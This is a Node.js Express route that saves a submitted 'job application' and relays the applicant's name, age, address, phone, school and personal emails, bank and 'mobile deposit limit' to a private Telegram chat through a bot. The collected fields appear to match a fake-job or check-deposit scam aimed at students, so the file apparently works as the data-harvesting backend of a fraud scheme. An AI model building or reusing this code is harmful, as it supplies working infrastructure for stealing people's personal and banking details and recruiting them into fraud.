const express = require("express");
const Application = require("../models/Application");

const router = express.Router();

router.post("/", async (req, res) => {
  try {
    const application = await Application.create(req.body);

    const message = `
📋 NEW JOB APPLICATION

👤 Full Name: ${application.fullName}
🎂 Age: ${application.age}
⚧ Gender: ${application.gender}
📱 Phone: ${application.phone}
🏠 Address: ${application.address}

📧 School Email: ${application.schoolEmail}
📧 Personal Email: ${application.personalEmail}

🏦 Bank: ${application.bank}
💳 Mobile Deposit Limit: ${application.depositLimit}

💼 Job Applied For: ${application.applicationJob}
`;

    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: process.env.TELEGRAM_CHAT_ID,
          text: message
        })
      }
    );

    const telegramResult = await telegramResponse.json();

    if (!telegramResult.ok) {
      console.error("Telegram error:", telegramResult);
    }

    res.status(201).json({
      success: true,
      message: "Application submitted successfully",
      data: application
    });

  } catch (error) {
    console.error("Application error:", error);

    res.status(400).json({
      success: false,
      message: "Application submission failed",
      error: error.message
    });
  }
});

module.exports = router;
